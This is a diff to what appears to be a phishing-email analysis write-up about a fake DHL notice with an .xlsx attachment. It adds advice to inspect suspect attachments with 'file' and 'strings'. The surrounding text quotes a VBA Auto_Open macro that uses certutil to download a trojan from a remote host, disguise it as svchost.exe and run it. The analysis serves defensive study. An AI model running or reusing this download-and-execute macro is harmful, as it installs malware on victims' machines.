@@ -77,6 +77,17 @@ Sent using **PHPMailer** from the send_phish.php script. This indicates that thi
   Return-Path: <noreply@sfrloyer.com>
   ```
 * **How:** The attacker sends a file purporting to be a notification from DHL. However, there is something suspicious about it: the file is in .xlsx format. Once the target opens the file, a script from the attacker runs automatically to download a malicious file from the attacker’s server and execute it immediately.
+
+To view the contents of an attachment in an email that you suspect is malicious, do not open the attachment directly. Use “file [file_name]” to view the original format of the attached file. Then examine the file's strings using “strings [file_name]”.
+
+
+```
+file DHL-Shipment-Notice.xlsx
+```
+
+```
+strings DHL-Shipment-Notice.xlsx
+```
   ```
   Sub Auto_Open()
   Shell "cmd /c certutil -urlcache -split -f http://c2.malware-drop.xyz/dhl_trojan.exe %TEMP%\svchost.exe && start %TEMP%\svchost.exe"
